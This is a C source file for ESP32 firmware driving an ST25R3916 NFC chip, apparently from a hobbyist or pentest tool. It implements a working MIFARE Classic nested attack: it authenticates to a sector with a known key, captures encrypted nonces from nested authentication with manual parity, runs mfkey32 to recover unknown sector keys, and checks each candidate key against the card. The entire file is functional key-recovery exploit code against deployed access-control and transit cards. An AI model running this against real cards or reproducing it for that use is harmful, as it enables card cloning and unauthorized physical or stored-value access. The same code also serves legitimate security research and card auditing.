// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "mf_nested.h"

#include <string.h>

#include "esp_log.h"

#include "mf_classic.h"
#include "crypto1.h"
#include "mfkey.h"
#include "iso14443a.h"
#include "poller.h"
#include "nfc_common.h"
#include "hb_nfc_spi.h"
#include "st25r3916_fifo.h"
#include "st25r3916_irq.h"
#include "st25r3916_reg.h"
#include "st25r3916_cmd.h"

static const char *TAG = "NFC_MF_NESTED";

#define ISOA_NO_TX_PAR (1U << 7)
#define ISOA_NO_RX_PAR (1U << 6)

#define MF_SMALL_BLOCK_COUNT   4
#define MF_4K_BIG_SECTOR_START 32
#define MF_4K_BIG_BLOCK_COUNT  16
#define MF_4K_BIG_BLOCK_BASE   128

#define MF_NESTED_RX_TIMEOUT_MS 20
#define MF_PRNG_AR_ADVANCE      64
#define MF_NESTED_NR_BASE       0xDEAD0000U

static inline void nested_bit_set(uint8_t *buf, size_t bitpos, uint8_t v) {
  if (v)
    buf[bitpos >> 3] |= (uint8_t)(1U << (bitpos & 7U));
  else
    buf[bitpos >> 3] &= (uint8_t) ~(1U << (bitpos & 7U));
}

static inline uint8_t nested_bit_get(const uint8_t *buf, size_t bitpos) {
  return (uint8_t)((buf[bitpos >> 3] >> (bitpos & 7U)) & 1U);
}

static uint8_t sector_to_first_block(uint8_t sector) {
  if (sector < MF_4K_BIG_SECTOR_START)
    return (uint8_t)(sector * MF_SMALL_BLOCK_COUNT);
  return (uint8_t)(MF_4K_BIG_BLOCK_BASE +
                   (sector - MF_4K_BIG_SECTOR_START) * MF_4K_BIG_BLOCK_COUNT);
}

static inline uint32_t be4_to_u32(const uint8_t b[4]) {
  return ((uint32_t)b[0] << 24) | ((uint32_t)b[1] << 16) | ((uint32_t)b[2] << 8) | (uint32_t)b[3];
}

static inline void u32_to_be4(uint32_t v, uint8_t b[4]) {
  b[0] = (uint8_t)(v >> 24);
  b[1] = (uint8_t)(v >> 16);
  b[2] = (uint8_t)(v >> 8);
  b[3] = (uint8_t)(v);
}

hb_nfc_err_t mf_nested_collect_sample(uint8_t target_block,
                                      const uint8_t uid[4],
                                      uint32_t nr_chosen,
                                      mf_nested_sample_t *sample) {
  if (uid == NULL || sample == NULL)
    return HB_NFC_ERR_PARAM;

  crypto1_state_t st;
  mf_classic_get_crypto_state(&st);

  const uint8_t cmd_plain[2] = {(uint8_t)MF_KEY_A, target_block};

  const size_t tx_bits = 2U * 9U;
  const size_t tx_bytes = (tx_bits + 7U) / 8U;

  uint8_t tx_buf[8] = {0};
  size_t bitpos = 0;

  for (int i = 0; i < 2; i++) {
    uint8_t plain = cmd_plain[i];
    uint8_t ks = crypto1_byte(&st, 0, 0);
    uint8_t enc = plain ^ ks;

    for (int bit = 0; bit < 8; bit++) {
      nested_bit_set(tx_buf, bitpos++, (enc >> bit) & 1U);
    }

    uint8_t par_ks = crypto1_filter_output(&st);
    uint8_t par = crypto1_odd_parity8(plain) ^ par_ks;
    nested_bit_set(tx_buf, bitpos++, par);
  }

  uint8_t iso_reg = 0;
  hb_nfc_spi_reg_read(ST25R3916_REG_ISO14443A, &iso_reg);
  hb_nfc_spi_reg_write(ST25R3916_REG_ISO14443A,
                       (uint8_t)(iso_reg | ISOA_NO_TX_PAR | ISOA_NO_RX_PAR));

  st25r3916_fifo_clear();
  st25r3916_fifo_set_tx_bytes((uint16_t)(tx_bits / 8U), (uint8_t)(tx_bits % 8U));
  st25r3916_fifo_load(tx_buf, tx_bytes);
  hb_nfc_spi_direct_cmd(ST25R3916_CMD_TX_WO_CRC);

  if (st25r3916_irq_wait_txe() != ESP_OK) {
    hb_nfc_spi_reg_write(ST25R3916_REG_ISO14443A, iso_reg);
    ESP_LOGW(TAG, "nested: TX timeout sending AUTH cmd");
    return HB_NFC_ERR_TX_TIMEOUT;
  }

  const size_t rx_bits = 4U * 9U;
  const size_t rx_bytes = (rx_bits + 7U) / 8U;

  uint16_t count = 0;
  (void)st25r3916_fifo_wait(rx_bytes, MF_NESTED_RX_TIMEOUT_MS, &count);
  if (count < rx_bytes) {
    hb_nfc_spi_reg_write(ST25R3916_REG_ISO14443A, iso_reg);
    ESP_LOGW(TAG,
             "nested: RX timeout waiting for nt (got %u need %u)",
             (unsigned)count,
             (unsigned)rx_bytes);
    return HB_NFC_ERR_TIMEOUT;
  }

  uint8_t rx_buf[8] = {0};
  st25r3916_fifo_read(rx_buf, rx_bytes);

  uint8_t nt_bytes[4] = {0};
  bitpos = 0;
  for (int i = 0; i < 4; i++) {
    uint8_t enc_byte = 0;
    for (int bit = 0; bit < 8; bit++) {
      enc_byte |= (uint8_t)(nested_bit_get(rx_buf, bitpos++) << bit);
    }
    uint8_t ks = crypto1_byte(&st, 0, 0);
    nt_bytes[i] = enc_byte ^ ks;
    bitpos++; /* skip parity bit */
  }

  uint32_t nt_plain = be4_to_u32(nt_bytes);
  ESP_LOGI(TAG, "nested: block %u  nt=0x%08" PRIX32, target_block, nt_plain);

  uint32_t uid32 = be4_to_u32(uid);
  crypto1_word(&st, nt_plain ^ uid32, 0);

  uint8_t nr_plain_bytes[4];
  uint8_t nr_enc_bytes[4];
  u32_to_be4(nr_chosen, nr_plain_bytes);

  const size_t tx2_bits = 8U * 9U;
  const size_t tx2_bytes = (tx2_bits + 7U) / 8U;
  uint8_t tx2_buf[12] = {0};
  size_t bitpos2 = 0;

  for (int i = 0; i < 4; i++) {
    uint8_t plain = nr_plain_bytes[i];
    uint8_t ks = crypto1_byte(&st, plain, 0);
    nr_enc_bytes[i] = plain ^ ks;

    for (int bit = 0; bit < 8; bit++) {
      nested_bit_set(tx2_buf, bitpos2++, (nr_enc_bytes[i] >> bit) & 1U);
    }
    uint8_t par_ks = crypto1_filter_output(&st);
    uint8_t par = crypto1_odd_parity8(plain) ^ par_ks;
    nested_bit_set(tx2_buf, bitpos2++, par);
  }

  uint32_t ar_plain_word = crypto1_prng_successor(nt_plain, MF_PRNG_AR_ADVANCE);
  uint8_t ar_plain_bytes[4];
  uint8_t ar_enc_bytes[4];
  u32_to_be4(ar_plain_word, ar_plain_bytes);

  for (int i = 0; i < 4; i++) {
    uint8_t plain = ar_plain_bytes[i];
    uint8_t ks = crypto1_byte(&st, 0, 0);
    ar_enc_bytes[i] = plain ^ ks;

    for (int bit = 0; bit < 8; bit++) {
      nested_bit_set(tx2_buf, bitpos2++, (ar_enc_bytes[i] >> bit) & 1U);
    }
    uint8_t par_ks = crypto1_filter_output(&st);
    uint8_t par = crypto1_odd_parity8(plain) ^ par_ks;
    nested_bit_set(tx2_buf, bitpos2++, par);
  }

  st25r3916_fifo_clear();
  st25r3916_fifo_set_tx_bytes((uint16_t)(tx2_bits / 8U), (uint8_t)(tx2_bits % 8U));
  st25r3916_fifo_load(tx2_buf, tx2_bytes);
  hb_nfc_spi_direct_cmd(ST25R3916_CMD_TX_WO_CRC);

  (void)st25r3916_irq_wait_txe();

  hb_nfc_spi_reg_write(ST25R3916_REG_ISO14443A, iso_reg);

  sample->nt = nt_plain;
  sample->nr_enc = be4_to_u32(nr_enc_bytes);
  sample->ar_enc = be4_to_u32(ar_enc_bytes);

  ESP_LOGI(TAG,
           "nested sample: nt=0x%08" PRIX32 " nr_enc=0x%08" PRIX32 " ar_enc=0x%08" PRIX32,
           sample->nt,
           sample->nr_enc,
           sample->ar_enc);

  return HB_NFC_OK;
}

hb_nfc_err_t mf_nested_attack(nfc_iso14443a_data_t *card,
                              uint8_t src_sector,
                              const mf_classic_key_t *src_key,
                              mf_key_type_t src_key_type,
                              uint8_t target_sector,
                              mf_classic_key_t *found_key_out,
                              mf_key_type_t *found_key_type_out) {
  if (card == NULL || src_key == NULL || found_key_out == NULL || found_key_type_out == NULL)
    return HB_NFC_ERR_PARAM;

  uint8_t src_block = sector_to_first_block(src_sector);
  uint8_t target_block = sector_to_first_block(target_sector);

  ESP_LOGI(TAG,
           "nested attack: src_sector=%u (block %u)  target_sector=%u (block %u)",
           src_sector,
           src_block,
           target_sector,
           target_block);

  mf_nested_sample_t samples[MF_NESTED_SAMPLE_COUNT];
  int n_samples = 0;

  for (int attempt = 0; attempt < MF_NESTED_MAX_ATTEMPTS && n_samples < MF_NESTED_SAMPLE_COUNT;
       attempt++) {
    mf_classic_reset_auth();

    hb_nfc_err_t sel_err = iso14443a_poller_reselect(card);
    if (sel_err != HB_NFC_OK) {
      ESP_LOGW(TAG, "nested: reselect failed on attempt %d (%d)", attempt, sel_err);
      continue;
    }

    hb_nfc_err_t auth_err = mf_classic_auth(src_block, src_key_type, src_key, card->uid);
    if (auth_err != HB_NFC_OK) {
      ESP_LOGW(TAG, "nested: src auth failed on attempt %d (%d)", attempt, auth_err);
      continue;
    }

    uint32_t nr_chosen = MF_NESTED_NR_BASE + (uint32_t)attempt;

    hb_nfc_err_t sample_err =
        mf_nested_collect_sample(target_block, card->uid, nr_chosen, &samples[n_samples]);
    if (sample_err == HB_NFC_OK) {
      n_samples++;
      ESP_LOGI(TAG, "nested: collected sample %d/%d", n_samples, MF_NESTED_SAMPLE_COUNT);
    } else {
      ESP_LOGW(TAG, "nested: collect_sample failed on attempt %d (%d)", attempt, sample_err);
    }
  }

  if (n_samples < 2) {
    ESP_LOGE(TAG, "nested: not enough samples (got %d, need >= 2)", n_samples);
    return HB_NFC_ERR_AUTH;
  }

  ESP_LOGI(TAG, "nested: running mfkey32 on %d sample pairs", n_samples - 1);

  uint32_t uid32 = ((uint32_t)card->uid[0] << 24) | ((uint32_t)card->uid[1] << 16) |
                   ((uint32_t)card->uid[2] << 8) | (uint32_t)card->uid[3];

  for (int i = 0; i < n_samples - 1; i++) {
    uint64_t key64 = 0;

    bool found = mfkey32(uid32,
                         samples[i].nt,
                         samples[i].nr_enc,
                         samples[i].ar_enc,
                         samples[i + 1].nt,
                         samples[i + 1].nr_enc,
                         samples[i + 1].ar_enc,
                         &key64);
    if (!found) {
      ESP_LOGD(TAG, "nested: mfkey32 pair %d/%d: no candidate", i, i + 1);
      continue;
    }

    ESP_LOGI(TAG, "nested: mfkey32 pair %d/%d: candidate 0x%012" PRIX64, i, i + 1, key64);

    mf_classic_key_t k;
    uint64_t tmp = key64;
    for (int b = 5; b >= 0; b--) {
      k.data[b] = (uint8_t)(tmp & 0xFFU);
      tmp >>= 8;
    }

    mf_classic_reset_auth();
    if (iso14443a_poller_reselect(card) != HB_NFC_OK) {
      ESP_LOGW(TAG, "nested: reselect failed during verification");
      continue;
    }

    if (mf_classic_auth(target_block, MF_KEY_A, &k, card->uid) == HB_NFC_OK) {
      ESP_LOGI(TAG, "nested: KEY A verified for sector %u", target_sector);
      *found_key_out = k;
      *found_key_type_out = MF_KEY_A;
      return HB_NFC_OK;
    }

    mf_classic_reset_auth();
    if (iso14443a_poller_reselect(card) != HB_NFC_OK) {
      ESP_LOGW(TAG, "nested: reselect failed during Key B verification");
      continue;
    }

    if (mf_classic_auth(target_block, MF_KEY_B, &k, card->uid) == HB_NFC_OK) {
      ESP_LOGI(TAG, "nested: KEY B verified for sector %u", target_sector);
      *found_key_out = k;
      *found_key_type_out = MF_KEY_B;
      return HB_NFC_OK;
    }

    ESP_LOGD(TAG, "nested: candidate key failed real auth for sector %u", target_sector);
  }

  ESP_LOGW(TAG, "nested: attack exhausted all pairs — no key found for sector %u", target_sector);
  return HB_NFC_ERR_AUTH;
}
